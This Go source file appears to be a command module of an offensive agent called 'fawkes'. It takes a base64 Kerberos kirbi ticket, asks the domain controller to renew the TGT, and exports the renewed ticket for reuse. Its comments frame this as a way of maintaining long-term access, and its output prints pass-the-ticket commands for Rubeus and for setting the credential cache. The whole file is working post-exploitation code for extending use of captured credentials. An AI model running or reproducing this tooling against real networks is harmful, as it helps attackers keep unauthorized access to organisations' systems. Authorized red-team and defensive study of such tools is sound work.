// ticket_renew.go implements Kerberos TGT renewal. Accepts a base64-encoded
// kirbi ticket and requests a renewed TGT from the KDC, extending the ticket
// lifetime without re-authenticating. Useful for maintaining long-term access.

package commands

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ticketRenew renews an existing TGT by sending a TGS-REQ with the RENEW flag.
// The input ticket must be renewable (have the Renewable flag set).
// Returns a new TGT with an extended lifetime.
func ticketRenew(args ticketArgs) structs.CommandResult {
	if args.Ticket == "" || args.Realm == "" || args.Server == "" {
		return errorResult("Error: ticket (base64 kirbi), realm, and server (KDC) are required for renew")
	}

	realm := strings.ToUpper(args.Realm)
	if args.Format == "" {
		args.Format = "kirbi"
	}

	// Parse the input kirbi ticket
	kirbiBytes, err := base64.StdEncoding.DecodeString(args.Ticket)
	if err != nil {
		return errorf("Error decoding base64 ticket: %v", err)
	}

	tgt, sessionKey, username, err := ticketParseKirbi(kirbiBytes)
	if err != nil {
		return errorf("Error parsing kirbi: %v", err)
	}
	defer structs.ZeroBytes(sessionKey.KeyValue)

	// Resolve KDC address
	kdcAddr := args.Server
	if !strings.Contains(kdcAddr, ":") {
		kdcAddr += ":88"
	}

	// Determine etype config name from session key type
	_, etypeCfgName, errResult := ticketParseKeyTypeByEtype(sessionKey.KeyType)
	if errResult != nil {
		return *errResult
	}

	// Build TGS-REQ with RENEW flag
	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n  renewable = true\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
	cfg, err := config.NewFromString(cfgStr)
	if err != nil {
		return errorf("Error creating Kerberos config: %v", err)
	}

	cname := tgt.SName // Use the TGT's service name for the request
	sname := tgt.SName // krbtgt/REALM

	// Use the CName from the kirbi if available
	if username != "" {
		cname = types.PrincipalName{
			NameType:   1, // KRB_NT_PRINCIPAL
			NameString: []string{username},
		}
	}

	tgsReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, sessionKey, sname, true)
	if err != nil {
		return errorf("Error building TGS-REQ: %v", err)
	}

	// Set RENEW flag
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Renew)
	// Also set Renewable to request renewable ticket
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Renewable)

	// Send TGS-REQ
	respBuf, err := ticketKDCSend(tgsReq.Marshal, kdcAddr)
	if err != nil {
		return errorf("Error sending renewal request: %v", err)
	}

	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		return errorf("KDC rejected renewal: %v", ticketParseKRBError(respBuf))
	}

	// Parse TGS-REP
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBuf); err != nil {
		return errorf("Error parsing TGS-REP: %v", err)
	}

	// Decrypt TGS-REP EncPart using TGT session key
	plainBytes, err := crypto.DecryptEncPart(tgsRep.EncPart, sessionKey, keyusage.TGS_REP_ENCPART_SESSION_KEY)
	if err != nil {
		return errorf("Error decrypting TGS-REP: %v", err)
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return errorf("Error parsing TGS-REP EncPart: %v", err)
	}

	// Extract renewed ticket info
	newSessionKey := decPart.Key
	newSName := decPart.SName
	newFlags := decPart.Flags
	authTime := decPart.AuthTime
	endTime := decPart.EndTime
	renewTill := decPart.RenewTill

	cNameStr := username
	if cNameStr == "" {
		cNameStr = "unknown"
	}

	// Export renewed ticket
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiOut, err := ticketToKirbi(tgsRep.Ticket, newSessionKey, cNameStr, realm, newSName, newFlags, authTime, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = ticketRenewFormatOutput(cNameStr, realm, args.Server, newSessionKey, authTime, endTime, renewTill, args.Format, base64.StdEncoding.EncodeToString(kirbiOut))
	case "ccache":
		ticketBytes, err := tgsRep.Ticket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, newSessionKey, cNameStr, realm, newSName, newFlags, authTime, endTime, renewTill)
		output = ticketRenewFormatOutput(cNameStr, realm, args.Server, newSessionKey, authTime, endTime, renewTill, args.Format, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

// ticketParseKirbi parses a kirbi (KRB-CRED) file to extract the ticket,
// session key, and client principal name. Uses raw ASN.1 parsing to handle
// both gokrb5-generated and manually-constructed kirbi formats.
func ticketParseKirbi(kirbiBytes []byte) (messages.Ticket, types.EncryptionKey, string, error) {
	// Strip APPLICATION 22 wrapper
	var outer asn1.RawValue
	if _, err := asn1.Unmarshal(kirbiBytes, &outer); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("unmarshal KRB-CRED outer: %v", err)
	}

	// Parse the inner SEQUENCE fields using marshalKRBCred-compatible struct
	type krbCredParsed struct {
		PVNO    int                 `asn1:"explicit,tag:0"`
		MsgType int                 `asn1:"explicit,tag:1"`
		Tickets asn1.RawValue       `asn1:"explicit,tag:2"`
		EncPart types.EncryptedData `asn1:"explicit,tag:3"`
	}

	var parsed krbCredParsed
	if _, err := asn1.Unmarshal(outer.Bytes, &parsed); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("unmarshal KRB-CRED body: %v", err)
	}

	// Parse the first ticket from the SEQUENCE OF Ticket
	ticketData := parsed.Tickets.Bytes
	if len(ticketData) == 0 {
		return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("KRB-CRED contains no tickets")
	}

	var ticket messages.Ticket
	if err := ticket.Unmarshal(ticketData); err != nil {
		// Try parsing as raw value first to get the ticket bytes
		var ticketRaw asn1.RawValue
		if _, err2 := asn1.Unmarshal(ticketData, &ticketRaw); err2 != nil {
			return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("unmarshal ticket: %v (raw: %v)", err, err2)
		}
		if err := ticket.Unmarshal(ticketRaw.FullBytes); err != nil {
			return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("unmarshal ticket from raw: %v", err)
		}
	}

	// Parse EncKrbCredPart from the cipher (etype 0 = no encryption)
	var credPart messages.EncKrbCredPart
	if err := credPart.Unmarshal(parsed.EncPart.Cipher); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("unmarshal EncKrbCredPart: %v", err)
	}

	if len(credPart.TicketInfo) == 0 {
		return messages.Ticket{}, types.EncryptionKey{}, "", fmt.Errorf("KRB-CRED contains no ticket info")
	}

	info := credPart.TicketInfo[0]
	username := ""
	if len(info.PName.NameString) > 0 {
		username = info.PName.NameString[0]
	}

	return ticket, info.Key, username, nil
}

// ticketParseKeyTypeByEtype returns the config name for a given etype ID.
func ticketParseKeyTypeByEtype(etypeID int32) (int32, string, *structs.CommandResult) {
	switch etypeID {
	case 18:
		return 18, "aes256-cts-hmac-sha1-96", nil
	case 17:
		return 17, "aes128-cts-hmac-sha1-96", nil
	case 23:
		return 23, "rc4-hmac", nil
	default:
		return etypeID, "aes256-cts-hmac-sha1-96", nil // fallback
	}
}

func ticketRenewFormatOutput(username, realm, server string, sessionKey types.EncryptionKey, authTime, endTime, renewTill time.Time, format, b64 string) string {
	var sb strings.Builder
	sb.WriteString("[*] TGT renewed successfully\n")
	sb.WriteString(fmt.Sprintf("    User:          %s@%s\n", username, realm))
	sb.WriteString(fmt.Sprintf("    KDC:           %s\n", server))
	sb.WriteString(fmt.Sprintf("    Session Key:   etype %d\n", sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:         %s — %s\n", authTime.Format("2006-01-02 15:04:05 UTC"), endTime.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Renew Till:    %s\n", renewTill.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:        %s\n", format))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", format, b64))

	if format == "kirbi" {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
	} else {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
	}

	return sb.String()
}
